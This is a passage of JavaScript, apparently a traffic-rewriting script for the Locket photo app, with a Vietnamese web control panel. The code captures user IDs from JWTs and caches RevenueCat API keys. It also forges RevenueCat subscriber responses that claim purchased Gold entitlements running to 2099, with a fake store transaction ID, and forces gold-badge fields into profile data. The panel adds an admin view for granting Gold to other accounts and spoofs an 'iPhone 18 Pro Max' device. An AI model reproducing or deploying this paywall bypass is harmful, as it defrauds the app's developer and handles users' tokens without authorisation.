                                const jwtUid = jsonPayload.user_id || jsonPayload.sub;
                                if (jwtUid && typeof jwtUid === "string") {
                                    foundUid = jwtUid;
                                    Env.write(foundUid, USER_ID_CACHE_KEY);
                                    Env.write(foundUid, "RC_UID");
                                }
                            }
                        } catch (e) {}
                    }
                } else if (/^appl_|^goog_|^rcb_/i.test(val.replace(/^Bearer\s+/i, ""))) {
                    Env.write(val, RC_API_KEY_CACHE_KEY);
                }
            }
        }
    }

    const finalUid = foundUid || Env.read(USER_ID_CACHE_KEY) || "$RCAnonymousID:locket_hard_lock";
    if (finalUid && !finalUid.includes("RCAnonymousID")) {
        upsertUserRecord(finalUid, { username: foundUsername, avatar: foundAvatar });
    }
    return finalUid;
}

function parseQuery(url) {
    const q = {};
    const idx = url.indexOf("?");
    if (idx === -1) return q;
    const pairs = url.slice(idx + 1).split("&");
    for (const p of pairs) {
        if (!p) continue;
        const eq = p.indexOf("=");
        if (eq === -1) {
            q[decodeURIComponent(p)] = "";
        } else {
            const k = decodeURIComponent(p.slice(0, eq));
            const v = decodeURIComponent(p.slice(eq + 1).replace(/\+/g, " "));
            q[k] = v;
        }
    }
    return q;
}

function buildSubscriberPayload(existingObj, cfg, resolvedUserId) {
    if (cfg.isBlockedByAdmin) {
        triggerInAppLocketBlockAlert(resolvedUserId, cfg.blockReason, true, false);
    } else {
        triggerInAppLocketBlockAlert(resolvedUserId, "", false, false);
    }

    const LOCK_DATE = cfg.lockIso;
    const EXPIRE_DATE = cfg.expireIso;
    const PRIMARY_PID = cfg.productId || "locket_199_1m";
    const isLifetimePkg = PRIMARY_PID === "locket_gold_lifetime";
    const effectiveExpireIso = isLifetimePkg ? "2099-12-31T23:59:59Z" : EXPIRE_DATE;
    const nowIso = new Date().toISOString();
    const nowMs = Date.now();

    const obj = (existingObj && typeof existingObj === "object") ? existingObj : {};
    obj.Attention = cfg.isBlockedByAdmin
        ? `LOCKET GOLD KEPT — ${cfg.blockReason}`
        : `Locket Gold Hard Lock (${PRIMARY_PID} · ${cfg.deviceMarketingName}) Activated`;
    obj.request_date = nowIso;
    obj.request_date_ms = nowMs;

    if (!obj.subscriber || typeof obj.subscriber !== "object") {
        obj.subscriber = {};
    }

    const uid = obj.subscriber.original_app_user_id || resolvedUserId || "$RCAnonymousID:locket_hard_lock";
    obj.subscriber.original_app_user_id = uid;
    obj.subscriber.first_seen = LOCK_DATE;
    obj.subscriber.last_seen = nowIso;
    obj.subscriber.original_application_version = cfg.appVersion || "2.32.2";
    obj.subscriber.original_purchase_date = LOCK_DATE;
    obj.subscriber.management_url = "https://apps.apple.com/account/subscriptions";
    obj.subscriber.other_purchases = obj.subscriber.other_purchases || {};
    obj.subscriber.non_subscriptions = obj.subscriber.non_subscriptions || {};

    if (!obj.subscriber.subscriptions || typeof obj.subscriber.subscriptions !== "object") {
        obj.subscriber.subscriptions = {};
    }
    if (!obj.subscriber.entitlements || typeof obj.subscriber.entitlements !== "object") {
        obj.subscriber.entitlements = {};
    }
    if (!obj.subscriber.subscriber_attributes || typeof obj.subscriber.subscriber_attributes !== "object") {
        obj.subscriber.subscriber_attributes = {};
    }

    const forcedAttributes = {
        "$attConsentStatus": "notDetermined",
        "locket_gold_badge": "true",
        "badge": "locket_gold",
        "has_gold_badge": "true",
        "gold_badge_enabled": "true",
        "show_gold_badge": "true",
        "is_gold": "true",
        "membership_badge": "gold",
        "locket_plan_type": PRIMARY_PID,
        "locket_expires_date": effectiveExpireIso,
        "device_model": cfg.deviceModel || "iPhone19,3",
        "device_name": cfg.deviceMarketingName || "iPhone 18 Pro Max"
    };

    for (const [attrKey, attrVal] of Object.entries(forcedAttributes)) {
        obj.subscriber.subscriber_attributes[attrKey] = {
            value: attrVal,
            updated_at_ms: nowMs
        };
    }

    const buildSubEntry = (pid) => {
        const meta = PACKAGE_CATALOG[pid] || {};
        return {
            auto_resume_date: null,
            display_name: pid,
            is_sandbox: false,
            ownership_type: cfg.ownershipType || "PURCHASED",
            billing_issues_detected_at: null,
            management_url: "https://apps.apple.com/account/subscriptions",
            period_type: meta.period || cfg.periodType || "normal",
            price: {
                amount: (pid === PRIMARY_PID ? cfg.priceAmount : meta.price) || 1.99,
                currency: (pid === PRIMARY_PID ? cfg.priceCurrency : meta.currency) || "USD"
            },
            expires_date: effectiveExpireIso,
            grace_period_expires_date: null,
            refunded_at: null,
            unsubscribe_detected_at: null,
            original_purchase_date: LOCK_DATE,
            purchase_date: LOCK_DATE,
            store: cfg.store || "app_store",
            store_transaction_id: cfg.storeTransactionId || "490001234567893"
        };
    };

    const buildEntEntry = (pid) => ({
        grace_period_expires_date: null,
        purchase_date: LOCK_DATE,
        original_purchase_date: LOCK_DATE,
        product_identifier: pid,
        expires_date: effectiveExpireIso,
        ownership_type: cfg.ownershipType || "PURCHASED",
        store: cfg.store || "app_store"
    });

    const allProductIds = [
        PRIMARY_PID,
        "locket_199_1m",
        "locket_1600_1y",
        "locket_3600_1y",
        "locket_399_1m",
        "gold",
        "locket_gold_1y",
        "locket_gold_1m",
        "locket_gold_lifetime"
    ];

    for (const pid of allProductIds) {
        obj.subscriber.subscriptions[pid] = buildSubEntry(pid);
    }

    const allEntitlements = ["Gold", "gold", "pro", "Pro", "locket_gold", "premium", "plus"];
    for (const entKey of allEntitlements) {
        obj.subscriber.entitlements[entKey] = buildEntEntry(PRIMARY_PID);
    }

    return obj;
}

function deepForceBadgeInObject(node, cfg, depth = 0) {
    if (!node || typeof node !== "object" || depth > 8) return node;

    if (Array.isArray(node)) {
        for (let i = 0; i < node.length; i++) {
            deepForceBadgeInObject(node[i], cfg, depth + 1);
        }
        return node;
    }

    const hasUserShape = (
        "badge" in node ||
        "locket_gold_badge" in node ||
        "is_gold" in node ||
        ("uid" in node && ("username" in node || "first_name" in node || "profile_picture_url" in node))
    );

    if (hasUserShape) {
        node.badge = "locket_gold";
        node.locket_gold_badge = true;
        node.has_gold_badge = true;
        node.show_gold_badge = true;
        node.gold_badge = true;
        node.is_gold = true;
        node.gold_subscription = true;
        node.subscription_status = "active";
        node.product_id = cfg.productId || "locket_199_1m";
        node.device_model = cfg.deviceModel || "iPhone19,3";
        node.device_name = cfg.deviceMarketingName || "iPhone 18 Pro Max";
        node.original_purchase_date = cfg.lockIso;
        node.expires_date = cfg.expireIso;
    }

    if (node.fields && typeof node.fields === "object") {
        if (node.fields.uid || node.fields.username || node.fields.badge || node.fields.profile_picture_url) {
            node.fields.badge = { stringValue: "locket_gold" };
            node.fields.locket_gold_badge = { booleanValue: true };
            node.fields.has_gold_badge = { booleanValue: true };
            node.fields.show_gold_badge = { booleanValue: true };
            node.fields.is_gold = { booleanValue: true };
            node.fields.product_id = { stringValue: cfg.productId || "locket_199_1m" };
            node.fields.device_model = { stringValue: cfg.deviceModel || "iPhone19,3" };
            node.fields.gold_subscription_since = { timestampValue: cfg.lockIso };
            node.fields.gold_expires_at = { timestampValue: cfg.expireIso };
        }
    }

    for (const k of Object.keys(node)) {
        if (k === "badge") {
            node[k] = "locket_gold";
        } else if (k === "locket_gold_badge" || k === "has_gold_badge" || k === "show_gold_badge" || k === "is_gold") {
            node[k] = true;
        } else if (typeof node[k] === "object" && node[k] !== null) {
            deepForceBadgeInObject(node[k], cfg, depth + 1);
        }
    }

    return node;
}

function renderBentoWebPanel(cfg, statusMsg, openAdminDrawer = false) {
    const cachedUid = Env.read(USER_ID_CACHE_KEY) || "";
    const cachedUser = Env.read(USERNAME_CACHE_KEY) || "";
    const hasValidUid = cachedUid && !cachedUid.includes("RCAnonymousID");
    const isAdminLogged = Env.read(ADMIN_SESSION_KEY) === "1";
    const lastSk2Log = Env.read(LAST_INJECT_LOG_KEY) || "Sẵn sàng kích StoreKit 2 (locket_4.py engine)";

    const db = getLocalStore();
    const usersList = Object.values(db.users || {});
    const goldUsersList = usersList.filter(u => u.gold_active !== false);
    const blockedCount = usersList.filter(u => u.status === "blocked" || u.blocked).length;

    let packageSelectOptionsHtml = "";
    for (const [pid, meta] of Object.entries(PACKAGE_CATALOG)) {
        const selectedAttr = (cfg.productId === pid) ? "selected" : "";
        packageSelectOptionsHtml += `<option value="${escapeHtml(pid)}" ${selectedAttr}>${escapeHtml(pid)} — ${escapeHtml(meta.label)}</option>`;
    }
    if (!PACKAGE_CATALOG[cfg.productId]) {
        packageSelectOptionsHtml += `<option value="${escapeHtml(cfg.productId)}" selected>${escapeHtml(cfg.productId)} — Gói Tuỳ Chỉnh</option>`;
    }

    let deviceSelectOptionsHtml = "";
    for (const [dCode, dLabel] of Object.entries(DEVICE_PRESETS)) {
        const selectedAttr = (cfg.deviceModel === dCode) ? "selected" : "";
        deviceSelectOptionsHtml += `<option value="${escapeHtml(dCode)}" ${selectedAttr}>${escapeHtml(dLabel)}</option>`;
    }

    let goldDirectoryHtml = "";
    if (goldUsersList.length === 0) {
        goldDirectoryHtml = `<div class="empty-row">Chưa có tài khoản nào trong danh sách đã lên Gold.</div>`;
    } else {
        for (const u of goldUsersList) {
            const isBlk = u.status === "blocked" || u.blocked === true;
            const uName = u.username || (u.uid ? u.uid.slice(0, 10) : "user");
            const fName = u.full_name || uName;
            const uAvatar = u.avatar || `https://ui-avatars.com/api/?name=${encodeURIComponent(uName)}&background=1d1d1f&color=fff`;
            const lockD = u.force_lock_date || u.lock_date || cfg.lockDate;
            const expD = u.force_expire_date || u.expire_date || cfg.expireDate;
            const pkgId = u.force_product_id || u.product_id || cfg.productId || "locket_199_1m";
            const uDev = u.device_model || cfg.deviceModel || "iPhone19,3";

            goldDirectoryHtml += `
            <div class="dir-item" data-search="${escapeHtml((uName + " " + fName + " " + u.uid + " " + pkgId + " " + uDev).toLowerCase())}">
                <div class="dir-left">
                    <img src="${escapeHtml(uAvatar)}" onerror="this.src='https://ui-avatars.com/api/?name=${encodeURIComponent(uName)}&background=1d1d1f&color=fff'" class="dir-avatar" alt="avatar">
                    <div class="dir-info">
                        <div class="dir-name-row">
                            <span class="dir-fullname">${escapeHtml(fName)}</span>
                            <span class="dir-handle">@${escapeHtml(uName)}</span>
                            <span class="pill-badge pill-gold">Đã lên Locket Gold</span>
                            <span class="pill-badge" style="background:#eef2ff;color:#3730a3;border:1px solid #c7d2fe;">${escapeHtml(uDev)}</span>
                            ${isBlk ? `<span class="pill-badge pill-rose">Đang bị Admin chặn (Vẫn giữ Gold)</span>` : `<span class="pill-badge pill-emerald">Huy hiệu 24/7</span>`}
                        </div>
                        <div class="dir-mono">UID: ${escapeHtml(u.uid)} · Đăng ký: ${escapeHtml(lockD)} · Hết hạn: ${escapeHtml(expD)}</div>
                    </div>
                </div>
                <div class="dir-right"><span class="dir-tag">${escapeHtml(pkgId)}</span></div>
            </div>`;
        }
    }

    let adminTableHtml = "";
    if (usersList.length === 0) {
        adminTableHtml = `<div style="padding:24px;text-align:center;font-size:12px;color:#a1a1aa;">Chưa có người dùng nào được ghi nhận.</div>`;
    } else {
        for (const u of usersList) {
            const isBlk = u.status === "blocked" || u.blocked === true;
            const uName = u.username || (u.uid ? u.uid.slice(0, 10) : "user");
            const uPkg = u.force_product_id || u.product_id || cfg.productId || "locket_199_1m";
            const uExp = u.force_expire_date || u.expire_date || cfg.expireDate || "2099-12-31";
            adminTableHtml += `
            <div class="adm-row">
                <div style="min-width:0;">
                    <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
                        <span style="font-weight:600;font-size:13px;color:#fff;">@${escapeHtml(uName)}</span>
                        <span style="font-family:monospace;font-size:11px;color:#fcd34d;">UID: ${escapeHtml(u.uid)}</span>
                        <span class="pill-badge pill-gold">${escapeHtml(uPkg)}</span>
                        <span class="pill-badge ${isBlk ? "pill-rose-dark" : "pill-emerald-dark"}">
                            ${isBlk ? "Đang bị chặn (Báo trong Locket)" : "Cho phép hoạt động"}
                        </span>
                    </div>
                    <div style="font-family:monospace;font-size:11px;color:#a1a1aa;margin-top:4px;">
                        Mốc đăng ký: ${escapeHtml(u.force_lock_date || u.lock_date || "2026-05-25")} · Hết hạn: ${escapeHtml(uExp)}
                    </div>
                </div>
                <div style="display:flex;align-items:center;gap:8px;flex-shrink:0;">
                    ${isBlk ? `
                        <a href="/setdate?admin_drawer=1&admin_action=unblock&target_uid=${encodeURIComponent(u.uid)}" class="apple-btn btn-unblock">Gỡ chặn (Mở lại ngay)</a>
                    ` : `
                        <a href="/setdate?admin_drawer=1&admin_action=block&target_uid=${encodeURIComponent(u.uid)}" class="apple-btn btn-block-warn">Chặn (Báo Locket & Giữ Gold)</a>
                    `}
                    <a href="/setdate?admin_drawer=1&admin_action=delete&target_uid=${encodeURIComponent(u.uid)}" class="apple-btn btn-del-dark">Xoá</a>
                </div>
            </div>`;
        }
    }

    return `<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
<title>locket.com — Hệ Thống Locket Gold StoreKit 2 & Fake iPhone 18 Pro Max (iPhone19,3)</title>
<style>
  :root {
    --apple-bg: #f5f5f7;
    --apple-surface: #ffffff;
    --apple-ink: #1d1d1f;
    --apple-secondary: #6e6e73;
    --apple-tertiary: #86868b;
    --apple-blue: #0071e3;
    --apple-border-light: rgba(0, 0, 0, 0.065);
    --apple-border-strong: rgba(0, 0, 0, 0.12);
    --apple-dark-border: rgba(255, 255, 255, 0.09);
    --apple-radius-xl: 32px;
    --apple-radius-lg: 24px;
    --apple-ease: cubic-bezier(0.25, 0.1, 0.25, 1);
  }
  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Inter", sans-serif;
    background-color: var(--apple-bg);
    color: var(--apple-ink);
    -webkit-font-smoothing: antialiased;
    letter-spacing: -0.015em;
    line-height: 1.5;
    padding-bottom: 60px;
  }
  .apple-global-nav {
    position: sticky; top: 0; z-index: 50;
    background: rgba(245, 245, 247, 0.84);
    backdrop-filter: saturate(180%) blur(24px);
    -webkit-backdrop-filter: saturate(180%) blur(24px);
    border-bottom: 1px solid var(--apple-border-light);
  }
  .nav-inner { max-width: 980px; margin: 0 auto; padding: 0 20px; height: 48px; display: flex; align-items: center; justify-content: space-between; gap: 10px; }
  .nav-brand { display: flex; align-items: center; gap: 10px; text-decoration: none; color: var(--apple-ink); font-weight: 600; font-size: 14px; }
  .nav-right { display: flex; align-items: center; gap: 8px; }
  .pill-nav { display: inline-flex; align-items: center; gap: 6px; padding: 4px 12px; border-radius: 999px; font-size: 11px; font-weight: 600; }
  .pill-emerald { background: rgba(16, 185, 129, 0.14); border: 1px solid rgba(16, 185, 129, 0.28); color: #065f46; }
  .pill-emerald-dark { background: rgba(16, 185, 129, 0.2); color: #6ee7b7; }
  .pill-rose { background: rgba(244, 63, 94, 0.14); border: 1px solid rgba(244, 63, 94, 0.28); color: #9f1239; }
  .pill-rose-dark { background: rgba(244, 63, 94, 0.22); color: #fda4af; }
  .pill-gold { background: rgba(245, 158, 11, 0.15); border: 1px solid rgba(245, 158, 11, 0.32); color: #92400e; }
  .pill-badge { display: inline-block; padding: 2px 9px; border-radius: 999px; font-size: 10.5px; font-weight: 600; }
  .dot-live { width: 6px; height: 6px; border-radius: 50%; background: #10b981; }
  .container { max-width: 980px; margin: 0 auto; padding: 32px 20px 0; display: flex; flex-direction: column; gap: 32px; }
  .apple-bento-light { background-color: var(--apple-surface); border: 1px solid var(--apple-border-light); border-radius: var(--apple-radius-xl); padding: 28px 24px; box-shadow: 0 12px 36px -6px rgba(0, 0, 0, 0.035); }
  .apple-bento-dark { background: radial-gradient(125% 100% at 50% 0%, #1d1d22 0%, #121216 48%, #09090b 100%); border: 1px solid var(--apple-dark-border); border-radius: var(--apple-radius-xl); padding: 28px 24px; color: #ffffff; box-shadow: 0 28px 64px -12px rgba(0, 0, 0, 0.36); }
  .apple-subpanel-light { background-color: var(--apple-bg); border: 1px solid var(--apple-border-light); border-radius: var(--apple-radius-lg); padding: 20px; }
  .apple-subpanel-dark { background-color: rgba(255, 255, 255, 0.035); border: 1px solid var(--apple-dark-border); border-radius: var(--apple-radius-lg); padding: 20px; }
  .apple-gold-text { background: linear-gradient(135deg, #9a6f1a 0%, #c98a1c 35%, #e5a93b 70%, #b87c14 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
  .apple-titanium-text { background: linear-gradient(180deg, #ffffff 0%, #d4d4d8 68%, #a1a1aa 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
  .apple-btn { display: inline-flex; align-items: center; justify-content: center; border: none; text-decoration: none; cursor: pointer; font-family: inherit; transition: transform 0.2s var(--apple-ease); }
  .apple-btn:active { transform: scale(0.975); }
  .btn-nav-dark { padding: 5px 14px; border-radius: 999px; background: #1d1d1f; color: #fff; font-size: 11px; font-weight: 600; }
  .btn-primary-blue { padding: 13px 24px; border-radius: 14px; background: var(--apple-blue); color: #fff; font-size: 13.5px; font-weight: 600; width: 100%; }
  .btn-primary-ink { padding: 13px 24px; border-radius: 14px; background: #1d1d1f; color: #fff; font-size: 13.5px; font-weight: 600; width: 100%; }
  .btn-soft { padding: 11px 20px; border-radius: 14px; background: #f5f5f7; border: 1px solid var(--apple-border-light); color: var(--apple-ink); font-size: 12.5px; font-weight: 600; width: 100%; }
  .btn-block-warn { padding: 7px 13px; border-radius: 10px; background: rgba(245, 158, 11, 0.2); color: #fde68a; font-size: 11.5px; font-weight: 600; }
  .btn-unblock { padding: 7px 13px; border-radius: 10px; background: rgba(16, 185, 129, 0.25); color: #6ee7b7; font-size: 11.5px; font-weight: 600; }
  .btn-del-dark { padding: 7px 12px; border-radius: 10px; background: rgba(244, 63, 94, 0.22); color: #fda4af; font-size: 11.5px; font-weight: 600; }
  .apple-input-light { width: 100%; padding: 12px 15px; border-radius: 13px; background: #ffffff; border: 1px solid var(--apple-border-strong); color: var(--apple-ink); font-size: 14px; outline: none; }
  .apple-input-dark { width: 100%; padding: 12px 15px; border-radius: 13px; background: rgba(0, 0, 0, 0.55); border: 1px solid rgba(255, 255, 255, 0.14); color: #ffffff; font-size: 14px; outline: none; }
  .realtime-block-banner { background: radial-gradient(120% 100% at 50% 0%, #2b1115 0%, #160a0c 100%); border: 1px solid rgba(244, 63, 94, 0.45); border-radius: 24px; padding: 20px 24px; color: #fff; display: ${cfg.isBlockedByAdmin ? "flex" : "none"}; flex-direction: column; gap: 6px; }
  .toast-msg { padding: 14px 18px; border-radius: 18px; background: #ecfdf5; border: 1px solid #a7f3d0; color: #065f46; font-size: 13px; font-weight: 600; display: ${statusMsg ? "block" : "none"}; }
  .hero-sec { text-align: center; max-width: 820px; margin: 0 auto; }
  .hero-pills { display: flex; flex-wrap: wrap; justify-content: center; gap: 8px; margin-bottom: 18px; }
  .hero-pill { padding: 5px 14px; border-radius: 999px; background: #fff; border: 1px solid rgba(0,0,0,0.07); font-size: 11px; font-weight: 600; }
  .hero-title { font-size: clamp(28px, 5vw, 46px); font-weight: 700; letter-spacing: -0.035em; line-height: 1.1; }
  .spec-strip { margin-top: 24px; padding-top: 20px; border-top: 1px solid rgba(0,0,0,0.06); display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
  @media (min-width: 640px) { .spec-strip { grid-template-columns: repeat(5, 1fr); } }
  .spec-box-lbl { font-size: 11px; font-weight: 600; text-transform: uppercase; color: var(--apple-tertiary); }
  .spec-box-val { font-size: 13px; font-weight: 700; color: var(--apple-ink); margin-top: 2px; word-break: break-all; }
  .grid-2 { display: grid; grid-template-columns: 1fr; gap: 16px; }
  @media (min-width: 640px) { .grid-2 { grid-template-columns: repeat(2, 1fr); } }
  .grid-3 { display: grid; grid-template-columns: 1fr; gap: 14px; }
  @media (min-width: 640px) { .grid-3 { grid-template-columns: repeat(3, 1fr); } }
  .grid-4 { display: grid; grid-template-columns: 1fr; gap: 12px; }
  @media (min-width: 640px) { .grid-4 { grid-template-columns: repeat(4, 1fr); } }
  .field-lbl { display: block; font-size: 12px; font-weight: 600; color: var(--apple-ink); margin-bottom: 6px; }
  .preset-chips { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 8px; }
  .p-chip { padding: 5px 12px; border-radius: 999px; background: #fff; border: 1px solid rgba(0,0,0,0.08); font-size: 11.5px; font-weight: 600; cursor: pointer; }
  .p-chip:hover { border-color: var(--apple-blue); color: var(--apple-blue); }
  .dir-item { padding: 16px 0; border-bottom: 1px solid rgba(0,0,0,0.06); display: flex; flex-direction: column; gap: 10px; }
  @media (min-width: 640px) { .dir-item { flex-direction: row; align-items: center; justify-content: space-between; } }
  .dir-item:last-child { border-bottom: none; padding-bottom: 0; }
  .dir-left { display: flex; align-items: center; gap: 14px; min-width: 0; }
  .dir-avatar { width: 42px; height: 42px; border-radius: 50%; object-fit: cover; border: 1px solid rgba(0,0,0,0.1); flex-shrink: 0; }
  .dir-info { min-width: 0; }
  .dir-name-row { display: flex; flex-wrap: wrap; align-items: center; gap: 6px; }
  .dir-fullname { font-size: 14px; font-weight: 700; color: var(--apple-ink); }
  .dir-handle { font-size: 12px; font-weight: 500; color: var(--apple-secondary); }
  .dir-mono { font-family: "SF Mono", ui-monospace, monospace; font-size: 11px; color: var(--apple-tertiary); margin-top: 3px; word-break: break-all; }
  .dir-tag { font-family: "SF Mono", monospace; font-size: 11px; font-weight: 600; padding: 4px 10px; border-radius: 999px; background: #f5f5f7; }
  .adm-row { padding: 14px 0; border-bottom: 1px solid rgba(255,255,255,0.08); display: flex; flex-direction: column; gap: 10px; }
  @media (min-width: 640px) { .adm-row { flex-direction: row; align-items: center; justify-content: space-between; } }
  .adm-row:last-child { border-bottom: none; }
  .empty-row { padding: 28px 12px; text-align: center; font-size: 13px; color: var(--apple-tertiary); }
  .hidden { display: none !important; }
</style>
</head>
<body>
  <header class="apple-global-nav">
    <div class="nav-inner">
      <a href="/setdate" class="nav-brand">
        <span>locket.com</span>
        <span style="color:#d2d2d7;">|</span>
        <span style="font-size:11px;color:var(--apple-tertiary);font-weight:500;">StoreKit 2 Engine · ${escapeHtml(cfg.deviceMarketingName)} (${escapeHtml(cfg.deviceModel)})</span>
      </a>
      <div class="nav-right">
        <span id="navRealtimePill" class="pill-nav ${cfg.isBlockedByAdmin ? "pill-rose" : "pill-emerald"}">
          <span class="dot-live" style="background:${cfg.isBlockedByAdmin ? "#f43f5e" : "#10b981"}"></span>
          <span id="navRealtimeText">${cfg.isBlockedByAdmin ? "Đang bị chặn (Vẫn giữ Gold)" : "Gold 24/7 Đang Hoạt Động"}</span>
        </span>
        <button type="button" onclick="toggleAdminDrawer()" class="apple-btn btn-nav-dark">
          ${isAdminLogged ? `Root Admin (${ROOT_ADMIN_USER})` : "Quản Trị Admin"}
        </button>
      </div>
    </div>
  </header>

  <main class="container">
    <div id="realtimeBlockBanner" class="realtime-block-banner">
      <div style="display:flex;align-items:center;justify-content:space-between;gap:10px;">
        <span class="pill-badge pill-rose-dark">THÔNG BÁO TỪ QUẢN TRỊ VIÊN</span>
        <span class="pill-badge pill-gold">VẪN GIỮ HUY HIỆU LOCKET GOLD 24/7</span>
      </div>
      <div style="font-size:17px;font-weight:700;margin-top:4px;">Tài khoản của bạn đang bị Admin tạm chặn</div>
      <div id="realtimeBlockReasonText" style="font-size:13px;color:#fda4af;">
        ${escapeHtml(cfg.blockReason)} — Khi Admin gỡ chặn, thông báo này sẽ tự động biến mất ngay lập tức theo thời gian thực.
      </div>
    </div>

    <div class="toast-msg">${escapeHtml(statusMsg || "")}</div>

    <section id="adminCommandCenter" class="apple-bento-dark ${openAdminDrawer ? "" : "hidden"}">
      <div style="display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:12px;padding-bottom:20px;border-bottom:1px solid rgba(255,255,255,0.09);">
        <div>
          <span class="pill-badge" style="background:rgba(251,191,36,0.15);color:#fcd34d;border:1px solid rgba(251,191,36,0.3);">Bảng Điều Khiển Quản Trị Hệ Thống</span>
          <h2 class="apple-titanium-text" style="font-size:24px;font-weight:700;margin-top:8px;">Trung Tâm Quản Trị & Phê Duyệt Realtime</h2>
        </div>
        <div style="display:flex;gap:8px;">
          ${isAdminLogged ? `<a href="/setdate?admin_logout=1" class="apple-btn btn-del-dark">Đăng Xuất Admin</a>` : ""}
          <button type="button" onclick="toggleAdminDrawer()" class="apple-btn" style="padding:7px 14px;border-radius:999px;background:rgba(255,255,255,0.1);color:#fff;font-size:12px;font-weight:600;">Thu Gọn</button>
        </div>
      </div>

      ${!isAdminLogged ? `
        <form method="GET" action="/setdate" autocomplete="off" class="apple-subpanel-dark" style="max-width:420px;margin:24px auto 0;">
          <input type="hidden" name="admin_drawer" value="1">
          <input type="hidden" name="admin_login" value="1">
          <div style="margin-bottom:12px;">
            <label style="display:block;font-size:11px;color:#a1a1aa;margin-bottom:6px;">Tài khoản Admin</label>
            <input type="text" name="user" class="apple-input-dark" placeholder="Nhập username admin..." autocomplete="off" required>
          </div>
          <div style="margin-bottom:16px;">
            <label style="display:block;font-size:11px;color:#a1a1aa;margin-bottom:6px;">Mật khẩu bảo mật</label>
            <input type="password" name="pass" class="apple-input-dark" placeholder="Nhập mật khẩu..." autocomplete="new-password" required>
          </div>
          <button type="submit" class="apple-btn btn-primary-blue">Đăng Nhập Quản Trị</button>
        </form>
      ` : `
        <div style="margin-top:22px;display:flex;flex-direction:column;gap:20px;">
          <div class="grid-3">
            <div class="apple-subpanel-dark">
              <div style="font-size:11px;font-weight:600;text-transform:uppercase;color:#a1a1aa;">Phiên Đăng Nhập</div>
              <div style="font-size:18px;font-weight:700;color:#fff;margin-top:4px;">${ROOT_ADMIN_USER}</div>
            </div>
            <div class="apple-subpanel-dark">
              <div style="font-size:11px;font-weight:600;text-transform:uppercase;color:#a1a1aa;">Tổng Người Đã Lên Gold</div>
              <div style="font-size:22px;font-weight:700;color:#34d399;margin-top:4px;">${goldUsersList.length}</div>
            </div>
            <div class="apple-subpanel-dark">
              <div style="font-size:11px;font-weight:600;text-transform:uppercase;color:#a1a1aa;">Đang Bị Chặn Cảnh Báo</div>
              <div style="font-size:22px;font-weight:700;color:#fb7185;margin-top:4px;">${blockedCount}</div>
            </div>
          </div>

          <form method="GET" action="/setdate" class="apple-subpanel-dark">
            <input type="hidden" name="admin_drawer" value="1">
            <input type="hidden" name="admin_action" value="add_gold">
            <div class="grid-4">
              <input type="text" name="target_uid" value="${escapeHtml(hasValidUid ? cachedUid : "")}" class="apple-input-dark" placeholder="Nhập UID Locket..." required>
              <input type="text" name="target_user" value="${escapeHtml(cachedUser)}" class="apple-input-dark" placeholder="Nhập @username...">
              <input type="text" name="target_pkg" value="${escapeHtml(cfg.productId)}" class="apple-input-dark" placeholder="Mã gói (vd: locket_199_1m)">
              <input type="text" name="target_exp" value="${escapeHtml(cfg.expireDate)}" class="apple-input-dark" placeholder="Hết hạn (YYYY-MM-DD)">
            </div>
            <button type="submit" class="apple-btn" style="margin-top:12px;width:100%;background:#fbbf24;color:#1d1d1f;font-weight:700;font-size:13px;border-radius:13px;padding:12px;">Kích Hoạt / Cập Nhật Gói & Hạn Sử Dụng Ngay</button>
          </form>

          <div class="apple-subpanel-dark">
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
              <div style="font-size:14px;font-weight:700;color:#fff;">Quản Lý Danh Sách Tài Khoản Đã Lên Gold</div>
              <a href="/setdate?admin_drawer=1&admin_action=unblock_all" style="font-size:12px;font-weight:600;color:#34d399;text-decoration:none;">Gỡ chặn tất cả</a>
            </div>
            ${adminTableHtml}
          </div>
        </div>
      `}
    </section>

    <section class="hero-sec">
      <div class="hero-pills">
        <span class="hero-pill">Fake Phần Cứng: ${escapeHtml(cfg.deviceMarketingName)} (${escapeHtml(cfg.deviceModel)})</span>
        <span class="hero-pill">Tích Hợp Cơ Chế locket_4.py (StoreKit 2 Restore + Resolve UID)</span>
      </div>
      <h1 class="hero-title">
        Khoá cứng huy hiệu 24/7.<br>
        <span class="apple-gold-text">Giả lập iPhone 18 Pro Max (iPhone19,3) & StoreKit 2.</span>
      </h1>
      <div class="spec-strip">
        <div>
          <div class="spec-box-lbl">Thiết Bị Giả Lập</div>
          <div class="spec-box-val" style="color:#0071e3;">${escapeHtml(cfg.deviceMarketingName)} (${escapeHtml(cfg.deviceModel)})</div>
        </div>
        <div style="border-left:1px solid rgba(0,0,0,0.06);padding-left:8px;">
          <div class="spec-box-lbl">Loại Gói Đang Dùng</div>
          <div class="spec-box-val" style="color:#059669;">${escapeHtml(cfg.productId)}</div>
        </div>
        <div style="border-left:1px solid rgba(0,0,0,0.06);padding-left:8px;">
          <div class="spec-box-lbl">Mốc Đăng Ký</div>
          <div class="spec-box-val">${escapeHtml(cfg.lockDate)}</div>
        </div>
        <div style="border-left:1px solid rgba(0,0,0,0.06);padding-left:8px;">
          <div class="spec-box-lbl">Thời Gian Hết Hạn</div>
          <div class="spec-box-val" style="color:#b45309;">${escapeHtml(cfg.expireDate)}</div>
        </div>
        <div style="border-left:1px solid rgba(0,0,0,0.06);padding-left:8px;">
          <div class="spec-box-lbl">User ID Đã Bắt</div>
          <div class="spec-box-val">${escapeHtml(hasValidUid ? cachedUid.slice(0, 12) + "..." : "Chưa bắt")}</div>
        </div>
      </div>
    </section>

    <!-- BẢNG ĐIỀU KHIỂN CƠ CHẾ LOCKET_4.PY: RESOLVE UID & INJECT STOREKIT 2 -->
    <section class="apple-bento-light">
      <div style="display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:10px;margin-bottom:16px;">
        <div>
          <span class="pill-badge pill-gold">CƠ CHẾ LOCKET_4.PY TRỰC TIẾP</span>
